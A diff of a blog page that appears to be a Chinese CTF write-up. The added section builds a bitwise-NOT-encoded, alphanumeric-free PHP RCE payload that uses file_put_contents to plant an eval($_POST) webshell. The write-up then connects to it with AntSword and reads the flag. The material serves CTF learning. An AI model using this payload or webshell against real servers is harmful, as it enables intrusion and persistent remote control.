@@ -31,6 +31,11 @@
 <meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230408233044629.png">
 <meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230409020606351.png">
 <meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230409020801312.png">
+<meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230409154816719.png">
+<meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230409161554426.png">
+<meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230409161615101.png">
+<meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230409161705804.png">
+<meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230409161802859.png">
 <meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230406153731384.png">
 <meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230406170242128.png">
 <meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230406171445334.png">
@@ -38,7 +43,7 @@
 <meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230406173119381.png">
 <meta property="og:image" content="http://example.com/2023/02/09/ROIS/image-20230406173259433.png">
 <meta property="article:published_time" content="2023-02-09T06:04:05.000Z">
-<meta property="article:modified_time" content="2023-04-08T18:38:02.593Z">
+<meta property="article:modified_time" content="2023-04-09T08:18:10.165Z">
 <meta property="article:author" content="Potat0w0">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="Misc">
@@ -255,7 +260,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          18k words
+          19k words
         
       </span>
     
@@ -266,7 +271,7 @@
         
         
         
-          149 mins
+          157 mins
         
       </span>
     
@@ -395,7 +400,26 @@
 <p>url解码得到真正的flag。<code>bin2hex()</code>函数也没被ban，能将结果变为16进制。</p>
 <p><img src="/2023/02/09/ROIS/image-20230409020801312.png" srcset="/img/loading.gif" lazyload></p>
 <p>hex解码后得到真正的flag。</p>
-<p>那么如果不从浏览器中显示，而是直接读取文件呢？这样一来就不会有通过浏览器将fakeflag显示出来了。没错也就是实现rce后用蚁剑连接</p>
+<p>那么如果不从浏览器中显示，而是直接读取文件呢？这样一来就不会有通过浏览器将fakeflag显示出来了，即使缓冲区被修改了也不会通过浏览器被读取因为是直接读取文件。没错也就是上马实现rce后用蚁剑连接。</p>
+<p>但是在层层的过滤之下怎么getshell呢？这时候就要有请无数字字母rce了</p>
+<p>学习了<a target="_blank" rel="noopener" href="http://arsenetang.com/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">这篇文章</a>，用了大佬的无字母数字rce：</p>
+<p><img src="/2023/02/09/ROIS/image-20230409154816719.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~(%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>A%A0%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>B%A0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">8</span>C))(~(%CB%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F),~(%C3%C0%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%<span class="hljs-number">9</span>A%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));<br></code></pre></td></tr></table></figure>
+
+<p>自己动手操作一遍：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;file_put_contents&quot;</span>;<br><span class="hljs-variable">$b</span>=~<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$file</span>=<span class="hljs-string">&quot;233.php&quot;</span>;<br><span class="hljs-variable">$c</span>=~<span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;&lt;?php eval(\$_POST[1]);&quot;</span>;<br><span class="hljs-variable">$d</span>=~<span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-comment">#output:</span><br><span class="hljs-comment">#%99%96%93%9A%A0%8F%8A%8B%A0%9C%90%91%8B%9A%91%8B%8C</span><br><span class="hljs-comment">#%CD%CC%CC%D1%8F%97%8F</span><br><span class="hljs-comment">#%C3%C0%8F%97%8F%DF%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4</span><br></code></pre></td></tr></table></figure>
+
+<p>因此rce应为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=(~(%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>A%A0%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>A%<span class="hljs-number">8</span>B%A0%<span class="hljs-number">9</span>C%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>B%<span class="hljs-number">8</span>C))(~(%CD%CC%CC%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F),~(%C3%C0%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%<span class="hljs-number">9</span>A%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%C4));<br></code></pre></td></tr></table></figure>
+
+<p>cmd传入：</p>
+<p><img src="/2023/02/09/ROIS/image-20230409161554426.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现已经写入当前目录了(如果没有写入说明当前目录对用户没开放写入权限，就要写入&#x2F;tmp目录)</p>
+<p><img src="/2023/02/09/ROIS/image-20230409161615101.png" srcset="/img/loading.gif" lazyload></p>
+<p>木马上完了，打开蚁剑，测试连接，连接成功。</p>
+<p><img src="/2023/02/09/ROIS/image-20230409161705804.png" srcset="/img/loading.gif" lazyload></p>
+<p>读取根目录下的flag：</p>
+<p><img src="/2023/02/09/ROIS/image-20230409161802859.png" srcset="/img/loading.gif" lazyload></p>
 <p>附：</p>
 <ol>
 <li><p>缓冲(buffer)与缓存(cache)：</p>
